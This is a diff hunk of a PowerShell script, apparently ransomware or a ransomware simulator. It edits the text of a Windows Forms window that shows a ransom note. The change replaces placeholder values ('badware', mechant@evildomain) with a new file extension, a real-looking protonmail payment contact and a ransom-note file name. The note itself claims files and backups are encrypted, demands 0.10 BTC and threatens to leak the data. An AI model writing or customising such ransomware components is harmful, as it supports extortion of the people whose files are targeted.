@@ -260,7 +260,7 @@ $Form.Controls.Add($Label1)
 
 $objTextBox1 = New-Object System.Windows.Forms.TextBox 
 $objTextBox1.Multiline = $True;
-$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""badware"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at mechant@evildomain with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Badware.txt file on the desktop for further information."
+$objTextBox1.Text = "We have encrypted your important files. For now you cannot access these files. Encrypted files have been modified with an extension ""lolipop"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 0.10 BTC these files will be leaked online. The faster you contact us at encrypted9000@protonmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Ransom_Notes.txt file on the desktop for further information."
 $objTextBox1.AutoSize = $true 
 $objTextBox1.Location = New-Object System.Drawing.Size(50,600)
 $objTextBox1.Size = New-Object System.Drawing.Size(850,180)
